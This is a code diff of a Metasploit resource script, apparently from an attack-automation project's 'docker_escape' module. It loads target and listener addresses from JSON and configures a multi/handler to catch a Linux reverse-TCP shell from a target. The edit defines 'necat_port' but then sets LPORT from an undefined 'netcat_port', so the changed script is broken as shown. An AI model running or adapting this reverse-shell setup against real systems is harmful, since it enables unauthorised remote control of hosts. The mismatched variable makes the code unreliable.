@@ -1,28 +1,20 @@
 <ruby>
     require 'json'
 
-   
-
     config_rc = 'data/attacker/custom_attacks/docker_escape/config_rc.json'
     json_data = JSON.parse(File.read(config_rc))
-
-    #global_config_path = '/home/ubuntu/stack_attacker/Netsploit/config.json'
-    #global_config_file = File.read(global_config_path)
-    #global_config_data = JSON.parse(config_file)
-    #necat_port = global_config_data["NETCAT_PORT"]
 
     #Vengono estratti i parametri dal json
     rhosts = json_data['TARGET_IP']
     lhost = json_data['LISTENING_IP']
     lport = json_data['LPORT']
-
-    #netcat_port = config_data['NETCAT_PORT']
+    necat_port = json_data["NETCAT_PORT"]
 
     #Vengono configurati i parametri di attacco in Metasploit
     run_single("route flush")
     run_single("set RHOSTS #{rhosts}")
     run_single("set LHOST #{lhost}")
-    run_single("set LPORT #{lport}")
+    run_single("set LPORT #{netcat_port}")
 
     run_single("use exploit/multi/handler")
     run_single("set payload linux/x86/shell_reverse_tcp")
